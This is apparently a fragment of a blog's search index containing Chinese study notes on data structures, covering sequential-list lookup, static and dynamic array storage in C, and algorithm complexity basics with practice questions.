<h5 id="动态分配"><a href="#动态分配" class="headerlink" title="动态分配"></a>动态分配</h5><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162027212.png" alt="image-20220518162027212"></p>
<p>malloc申请空间返回的指针与前面设置的指针数据类型应该相同</p>
<p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162350193.png" alt="image-20220518162350193"></p>
<p>最好/最坏/平均时间复杂度：O(1)</p>
<h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162644686.png" alt="image-20220518162644686"></p>
<h5 id="结构类型的比较"><a href="#结构类型的比较" class="headerlink" title="结构类型的比较"></a>结构类型的比较</h5><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162852560.png" alt="image-20220518162852560"></p>
<p>正确处理方式</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people == b.people) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">pritf(<span class="string">&quot;false&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isCustomerEqual</span> <span class="params">(Customer a,Customer b)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people ==b.people)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>按值查找的时间复杂度</p>
<script type="math/tex; mode=display">
最好时间复杂度:O(1)
最坏时间复杂度:O(n)
平均时间复杂度:O(n)</script>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>顺序表</tag>
      </tags>
  </entry>
  <entry>
    <title>线性表及顺序表的存储</title>
    <url>/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>线性表的定义以及顺序表的静态存储原理动态存储原理和代码实现</p>
<span id="more"></span>
<h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>是一个<strong>有限</strong>序列=&gt;有次序  （所以整数按照递增排列，不是线性表）</p>
<p>直接前驱 </p>
<script type="math/tex; mode=display">
a_1 \leftarrow a_2</script><p>a1是a2的直接前驱</p>
<p>直接后继</p>
<script type="math/tex; mode=display">
a_1 \rightarrow a_2</script><p>a2是a1的直接后继</p>
<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>引用型参数：需要对参数的修改结果需要带回来</p>
<h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p>用顺序存储的方式实现线性表——把逻辑上相邻的元素存储在物理位置也相邻的存储单元</p>
<p><img src="/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416212202152.png" alt="image-20220416212202152"></p>
<p><img src="/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416212232241.png" alt="image-20220416212232241"></p>
<h3 id="静态存储"><a href="#静态存储" class="headerlink" title="静态存储"></a>静态存储</h3><p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//定义最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];   <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;   <span class="comment">//顺序表当前元素长度</span></span><br><span class="line">&#125;SqList;   <span class="comment">//顺序表类型定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">		L.data[i]=<span class="number">0</span>;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;L.data[%d]=%d\n&quot;</span>,i,L.data[i]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p><img src="/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220415214246742.png" alt="image-20220415214246742"></p>
<p><strong>正常访问应该是i&lt;L.length，并且Length = 0是不可省略的</strong></p>
<h3 id="动态存储"><a href="#动态存储" class="headerlink" title="动态存储"></a>动态存储</h3><p>malloc函数用于申请空间</p>
<p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> *data;  <span class="comment">//指示动态分配数组的指针</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的当前长度</span></span><br><span class="line">	<span class="type">int</span> maxsize;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initlist</span><span class="params">(sqlist &amp;L)</span>&#123;</span><br><span class="line">	L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>(initsize*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	L.length = <span class="number">0</span>;</span><br><span class="line">	L.maxsize = initsize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加表长</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">increaselist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">	<span class="type">int</span> *p = L.data;</span><br><span class="line">	L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>((L.maxsize+len)*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">		L.data[i] = p[i];</span><br><span class="line">	&#125;</span><br><span class="line">	L.maxsize = L.maxsize+len;</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	initlist(L);</span><br><span class="line">	increaselist(L,<span class="number">5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416211821527.png" alt="image-20220416211821527"></p>
<p>realloc函数也可以实现上述过程</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构绪论</title>
    <url>/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>数据结构入门的一些概念，定义，算法，复杂度等</p>
<span id="more"></span>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>数据：信息的载体，被<strong>计算机程序识别和处理</strong>的符号的集合</p>
<p>数据元素：数据的<strong>基本单位</strong>，作为一个整体进行考虑和处理。可由若干<strong>数据项</strong>组成，数据项时构成数据元素的不可分割的<strong>最小单位</strong></p>
<p>组合项：由更细分的属性组成的数据项</p>
<p>数据对象：具有<strong>相同性质的数据元素的集合</strong>，是数据的一个子集</p>
<p>数据结构：相互之间存在一种或多种特定关系的数据元素的集合</p>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>对特定问题求解步骤的一种描述</p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><pre><code>       有穷性：算法是有穷的，程序可以是无穷的（死循环不是算法）

       确定性：相同的输入只能得到相同的输出

       可行性

       输入：0个或多个

       输出：1个或多个
</code></pre><h3 id="好算法的特质"><a href="#好算法的特质" class="headerlink" title="好算法的特质"></a>好算法的特质</h3><pre><code>        正确性

        可读性

        健壮性：输入非法数据时，能适当作出反应进行处理

        高效率，低存储需求：时间空间复杂度低
</code></pre><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><p>常对幂指阶</p>
<script type="math/tex; mode=display">
O(1)<O(log_2n)<O(n)<O(nlog_2n)<O(n^2)<O(n^3)<O(2^n)<O(n!)<O(n^n)</script><p>考虑数量级</p>
<script type="math/tex; mode=display">
T(n)=O(f(n)) \Leftrightarrow \lim\limits_{n\rightarrow\infty}\frac{T(n)}{f(n)}</script><p>加法</p>
<script type="math/tex; mode=display">
T(n)=T_1(n)+T_2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n))</script><p>乘法</p>
<script type="math/tex; mode=display">
T(n)=T_1(n)*T_2(n)=O(f(n))*O(g(n))=O(f(n)*g(n))</script><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>越高级的语言执行效率越低</p>
<h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>函数递归调用带来的内存开销，递归调用深度x与问题规模n的关系：x=f（n）</p>
<h3 id="数据结构三要素"><a href="#数据结构三要素" class="headerlink" title="数据结构三要素"></a>数据结构三要素</h3><p>逻辑结构        数据运算        存储结构</p>
<h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><p><img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/1.png" style="zoom: 80%;"></p>
<p>集合：数据元素同属于一个集合，没有其他关系</p>
<p>线性结构  ：只存在一对一的关系</p>
<p>树形结构  ：存在一对多的关系</p>
<p>网状结构或图状结构：存在多对多的关系</p>
<p><img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520173714417.png" style="zoom:80%;"></p>
<h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><p>1）顺序存储：逻辑上相邻物理上也相邻</p>
<p>2）链式存储：借助指针来表示元素之间的逻辑关系</p>
<p>3）索引存储：建立附加的索引表，索引项的一般形式（关键字，地址）</p>
<p>4）散列存储：哈希存储，根据元素的关键字</p>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>1.可以用（）定义一个完整的数据结构                  <strong>D</strong></p>
<p>   A.数据元素    B.数据对象    C.数据关系    D.抽象数据结构</p>
<p>2.数据结构的说法中，正确的（）                        <strong>A</strong></p>
<pre><code>A.数据的逻辑结构独立于其存储结构       

B.数据的存储结构独立于其逻辑结构                //存储结构是逻辑结构在计算机上的映射

C.数据的逻辑结构唯一决定其存储结构

D.数据结构仅由其逻辑结构和存储结构决定
</code></pre><p>3.<img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/3.png" alt>                <strong>A</strong></p>
<p> <img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/4.png" alt></p>
<p>4.<img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/5.png" alt></p>
<p><img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/6.png" alt></p>
<p>5.算法原地工作的含义是指算法所需的辅助空间是常量。</p>
<p>   时间复杂度总是考虑最坏情况下的时间复杂度，以保证算法的运行时间不会比它更长。</p>
<p>7.<img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182104382.png" alt></p>
<p> <img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182039190.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
</search>
